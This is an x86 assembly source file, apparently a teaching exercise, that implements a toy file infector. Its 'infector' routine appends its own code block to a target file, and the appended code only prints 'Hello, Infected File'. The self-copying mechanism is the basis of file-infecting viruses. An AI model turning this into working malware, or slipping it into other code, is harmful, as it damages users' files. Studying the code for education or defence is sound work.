section .data
    message: dd "Hello, Infected File", 10
global infector
global infection
global code_end
global _start
global system_call
global code_start
extern main

section .text
code_start:


infection:
    push    ebp
    mov     ebp, esp
    sub     esp, 4
    push    21  ;the length of message
    push    message ; the buffer
    push    1       ; stdout
    push    4       ; write command
    call    system_call   ; use the system call
    add     esp, 4
    mov     esp, ebp
    pop     ebp
    ret

infector:
    push    ebp
    mov     ebp, esp
	pushad

; we saw how to open/close  file from stackOverFlow

open:
	push 0777               ; file permissions
	push 1024 | 1           ; edit mode append or write
	mov eax, [ebp + 8]      ; file path to eax
	push eax                ; push file path
	push 5                  ; system call open
	call system_call
	add esp, 16
	push eax                ; push file path

write:
	push code_end - code_start      ; num of bytes to write
	push code_start                 ; where to start reading
	push eax                        ; push file path
	push 4                          ; system call write
	call system_call
	add esp, 16

close:
	push 6                          ; system call close
	call system_call
	add esp, 8
	popad
	mov esp, ebp
	pop ebp
	ret
code_end:

_start:
    pop dword ecx      ; ecx = argc
    mov esi, esp        ; esi = argv
    mov eax, ecx        ; Put the number of arguments into eax
    shl eax, 2      ; Compute the size of argv in bytes
    add eax, esi        ; Add the size to the address of argv
    add eax, 4      ; Skip NULL at the end of argv
    push dword eax      ; char *envp[]
    push dword esi      ; char *argv[]
    push dword ecx      ; int argc
    call main       ; int main( int argc, char *argv[], char *envp[] )
    mov ebx, eax
    mov eax, 1
    int 0x80
    nop

system_call:
    push ebp            ; Save caller state
    mov ebp, esp
    sub esp, 4          ; Leave space for local var on stack
    pushad          ; Save some more caller state
    mov eax, [ebp+8]    ; Copy function args to registers: leftmost...
    mov ebx, [ebp+12]   ; Next argument...
    mov ecx, [ebp+16]   ; Next argument...
    mov edx, [ebp+20]   ; Next argument...
    int 0x80        ; Transfer control to operating system
    mov [ebp-4], eax    ; Save returned value...
    popad           ; Restore caller state (registers)
    mov eax, [ebp-4]    ; Place returned value where caller can see it
    add esp, 4          ; Restore caller state
    pop ebp         ; Restore caller state
    ret             ; Back to caller
